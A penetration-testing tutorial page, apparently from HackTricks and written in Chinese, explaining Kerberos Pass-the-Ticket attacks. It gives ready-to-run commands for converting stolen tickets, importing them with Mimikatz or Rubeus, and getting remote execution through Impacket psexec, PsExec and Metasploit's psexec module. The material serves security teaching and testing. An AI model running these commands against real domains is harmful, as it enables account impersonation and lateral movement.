# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## 概述

在 Pass-the-Ticket (PtT) 攻击中，攻击者使用窃取的 Kerberos ticket，以该 ticket 主体的身份进行身份验证，而无需掌握该账户的密码。ticket-granting ticket (TGT) 可用于请求 service ticket，而窃取的 service ticket 则仅限于其目标服务和有效期内使用。<sup>[[1]](#references)</sup>

有关获取 ticket 的技术，请参阅：

- [从 Windows 收集 ticket](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [从 Linux 收集 ticket](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## 转换 Linux 和 Windows Ticket 格式

Kerberos 缓存通常在 Linux 上以 MIT `ccache` 文件的形式出现，在 Windows 上则以 `.kirbi` 文件的形式出现。`ticket_converter` 使用输入 ticket 和输出路径在这些格式之间进行转换。<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo 还提供 Windows 上的 Kerberos ticket 工具。<sup>[[3]](#references)</sup>

## 使用 Ticket

在 Linux 上，将 `KRB5CCNAME` 指向缓存，并指示 Impacket 客户端使用 Kerberos，且不提示输入密码：<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

在 Windows 上，Mimikatz 或 Rubeus 可以将 `.kirbi` 票据导入当前登录会话。使用 `klist` 检查生成的缓存。<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

票据导入不会授予超出该票据所代表权限及目标服务授权策略范围的权限。过期、已撤销、格式错误或作用域不正确的票据可能无法使用。<sup>[[1]](#references)</sup>

如需了解更广泛的 Kerberos 攻击背景及相关票据获取技术，请参阅 Tarlogic 的 Kerberos 攻击指南。<sup>[[7]](#references)</sup>

### 在 Metasploit 中重用外部票据

Metasploit 不会自动读取 Impacket 的 `KRB5CCNAME` 来供其 Kerberos 模块使用。通过协议专属的 `::Krb5Ccname` 选项，将 **ccache 文件**传递给模块。将 `::Rhostname` 设置为目标的 SPN 主机名，并将域设置为目标域；`RHOST` 仍可使用目标 IP。这样便可使用已获取的票据，而无需输入账户密码。<sup>[[8]](#references)</sup>

如有需要，请先将 `.kirbi` 转换为 ccache。<sup>[[9]](#references)</sup>

例如，若票据对应的账户有权在目标上创建服务，可使用该缓存运行 [SMB PsExec 模块](../lateral-movement/psexec-and-winexec.md)：<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit 会先从提供的缓存中选择匹配的 service ticket。如果只找到 TGT，它会向 KDC 请求 service ticket，因此这一路径也需要连接 DC。仅包含 service ticket 的缓存无法访问无关主机。对于其他受支持的模块，请更改选项前缀（例如，[WinRM](../lateral-movement/winrm.md) 使用 `Winrm::Krb5Ccname`）。<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket 示例](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos 攻击技术](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - 服务身份验证](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - 转换 kirbi 和 ccache 文件](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Metasploit SMB 客户端 Kerberos 实现](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
